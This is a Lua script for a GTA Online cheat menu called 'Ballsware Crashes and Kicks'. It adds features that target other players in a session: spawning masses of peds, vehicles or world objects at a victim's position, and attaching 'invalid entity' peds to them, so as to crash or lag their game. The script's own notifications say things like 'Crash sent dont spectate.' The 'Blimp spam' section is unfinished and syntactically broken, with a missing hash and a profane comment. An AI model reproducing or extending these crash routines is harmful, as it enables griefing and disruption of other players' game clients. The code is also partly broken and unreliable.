local c = {} --  base short api
local a = {} --  feature table


 --  base short api
c.df = menu.add_feature
c.wait = system.wait
c.ped = player.get_player_ped
c.me = player.player_id
c.pdf = menu.add_player_feature
c.sR = streaming.request_model
c.time = utils.time_ms





menu.notify("Crash Options loaded", 20, ff0000)


a.opption = c.pdf("Ballsware Crashes and Kicks","parent",0).id
local Crashs = menu.add_player_feature("Crashes and Kicks", "parent",a.opption).id







local function request_model(h, t)
			if not h then 
				return 
			end
			if not streaming.has_model_loaded(h) then
   				c.sR(h)
    			local time = c.time() + t
    			while not streaming.has_model_loaded(h) and time > c.time() do
       				c.wait(5)
   				end
			end
			return streaming.has_model_loaded(h)
		end


local function Cped(type, hash, coords, dir)
			request_model(hash, 300)
			local ped = ped.create_ped(type, hash, coords, dir, true, false)
			c.sR(hash)
			return ped
		end
		
		

bijiaodaxiao11= c.pdf("PED SPAM CRASH",Crashs,function(k,pid)
menu.notify("Crash sent dont spectate.", "PED SPAM CRASH", 10, ff0000)
for i = 0 , 30 do 
ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
pos = player.get_player_coords(pid)
npc = Cped(26, 0x92991B72,pos, 0)
c.wait(0)
end
for i = 0 , 30 do 
ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
pos = player.get_player_coords(pid)
npc = Cped(26, 0x92991B72,pos, 0)
c.wait(0)
end
for i = 0 , 30 do 
ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
pos = player.get_player_coords(pid)
npc = Cped(26, 0x92991B72,pos, 0)
c.wait(0)
end	
menu.notify("Crash complete", "PED SPAM CRASH", 10, ff0000)
end)


local req = {}
local watcher = {}
req.ctrl = function(e, t)
    if entity.is_an_entity(e) then
        if not network.has_control_of_entity(e) then
            network.request_control_of_entity(e)
            t = t or 25
            local time = utils.time_ms() + t
            while entity.is_an_entity(e) and not network.has_control_of_entity(e) do
                system.wait(0)
                network.request_control_of_entity(e)
                if time < utils.time_ms() then
                    return false
                end
            end
        end
        return network.has_control_of_entity(e)
    end
    return false
end

local function s_coords(i, p)
    req.ctrl(i)
    entity.set_entity_velocity(i, v3())
    entity.set_entity_coords_no_offset(i, p)
end

function removes()
	system.wait(5000)
	remove = object.get_all_objects()
		for i = 1, #remove do
			local X = remove[i]
			req.ctrl(X, 250)
			entity.set_entity_velocity(X, v3())
			s_coords(X, v3(8000, 8000, -1000))
			entity.delete_entity(X)
			system.wait(0)
		end
	menu.notify("World Crash Object has been cleaned", "", 10, 2)
end
	
watcher.event = nil

menu.add_player_feature("World Object Crash", "action", Crashs, function(playerfeat, pid)
	if watcher.event == nil then 
		entity.freeze_entity(player.get_player_ped(pid), true)
		object.create_world_object(3613262246, player.get_player_coords(pid), true, false)
		menu.notify("Crash Sent, Do Not Look At The Player", "", 10, 2)

		watcher.event = event.add_event_listener('player_leave', removes())
		if watcher.event then
			event.remove_event_listener('player_leave', watcher.event)	
		end
	end
end)

menu.add_player_feature("Invalid Entity Crash ", "action",Crashs, function(feat, pid)
menu.notify("Sent Invalid Entity Crash (dont be near person)", "Crash Menu", 10, ff0000)
    local function createped(type, hash, pos, dir)
        streaming.request_model(hash)
        while not streaming.has_model_loaded(hash) do
        system.wait(10)
        end
        local ped = ped.create_ped(type, hash, pos, dir, true, false)
            streaming.set_model_as_no_longer_needed(hash)
            return ped
        end
pos = player.get_player_coords(pid)
local pedp = player.get_player_ped(pid)
pos.z = pos.z + 0.6

npc1 = createped(26,0x2D7030F3,pos,0)
entity.attach_entity_to_entity(npc1,pedp, 0, v3(0.30,0,0.0),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc1, true)
local checkcount = 0
network.request_control_of_entity(npc1)
  while not network.has_control_of_entity(npc1) do
    system.wait(100)
    checkcount = checkcount + 1
    if checkcount > 10 then end
  end
   system.wait(2000)
entity.delete_entity(npc1)

npc2 = createped(26,0x856CFB02,pos,0)
entity.attach_entity_to_entity(npc2,pedp, 0, v3(0.30,0,0.0),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc2, true)
local checkcount = 0
network.request_control_of_entity(npc2)
  while not network.has_control_of_entity(npc2) do
    system.wait(2000)
    checkcount = checkcount + 1
    if checkcount > 10 then end
  end
   system.wait(2000)
entity.delete_entity(npc2)

npc3 = createped(26,0x856CFB02,pos,0)
entity.attach_entity_to_entity(npc3,pedp, 0, v3(0.30,0,0.0),v3(0.0,0,0.0), true, true, false, 0, true)
entity.freeze_entity(npc3, true)
local checkcount = 0
network.request_control_of_entity(npc3)
  while not network.has_control_of_entity(npc3) do
    system.wait(100)
    checkcount = checkcount + 1
    if checkcount > 10 then end
  end
    system.wait(2000)
entity.delete_entity(npc3)
menu.notify("Invalid Entity crash all done!", "Crash Menu", 10, ff0000)
end)


local Lag = menu.add_player_feature("Lag loops", "parent", a.opption).id
		
menu.add_player_feature("Sub spam", "toggle", Lag, function(feat, pid)                                                                                                                                                                                                                                                           
    if feat.on then
        local pos = player.get_player_coords(pid)
        local veh_hash = 0x4FAF0D70

streaming.request_model(veh_hash)
while (not streaming.has_model_loaded(veh_hash)) do
system.wait(10)
end

menu.add_player_feature("Blimp spam"),"toggle",function(feat, pid)
if feat.on then
        local pos = player.get_player_coords(pid)
        local veh_hash = --hex goes here--
--find the blimp hex add this motherfucker she'll make fps go from frames per second to seconds per frame
--also finish the function im lazy

local tableOfVehicles = {}
for i = 1, 75 do
  tableOfVehicles[#tableOfVehicles + 1] = vehicle.create_vehicle(veh_hash, pos, pos.z, true, false)
end
system.wait(1000)
for i = 1, #tableOfVehicles do
  entity.delete_entity(tableOfVehicles[i])
end
tableOfVehicles = {}

streaming.set_model_as_no_longer_needed(veh_hash)


        end
    return HANDLER_CONTINUE
end)

menu.add_player_feature("Dump Truck spam", "toggle", Lag, function(feat, pid)                                                                                                                                                                                                                                                           
    if feat.on then
        local pos = player.get_player_coords(pid)
        local veh_hash = 0x810369E2 

streaming.request_model(veh_hash)
while (not streaming.has_model_loaded(veh_hash)) do
system.wait(10)
end


local tableOfVehicles = {}
for i = 1, 75 do
  tableOfVehicles[#tableOfVehicles + 1] = vehicle.create_vehicle(veh_hash, pos, pos.z, true, false)
end
system.wait(1000)
for i = 1, #tableOfVehicles do
  entity.delete_entity(tableOfVehicles[i])
end
tableOfVehicles = {}

streaming.set_model_as_no_longer_needed(veh_hash)


        end
    return HANDLER_CONTINUE
end)

menu.add_player_feature("Cargo spam", "toggle", Lag, function(feat, pid)                                                                                                                                                                                                                                                           
	if feat.on then
		local pos = player.get_player_coords(pid)
		local veh_hash = 0x15F27762

streaming.request_model(veh_hash)
while (not streaming.has_model_loaded(veh_hash)) do
system.wait(10)
end

local tableOfVehicles = {}
for i = 1, 75 do
  tableOfVehicles[#tableOfVehicles + 1] = vehicle.create_vehicle(veh_hash, pos, pos.z, true, false)
end
system.wait(1000)
for i = 1, #tableOfVehicles do
  entity.delete_entity(tableOfVehicles[i])
end
tableOfVehicles = {}

streaming.set_model_as_no_longer_needed(veh_hash)



		end
	return HANDLER_CONTINUE
end)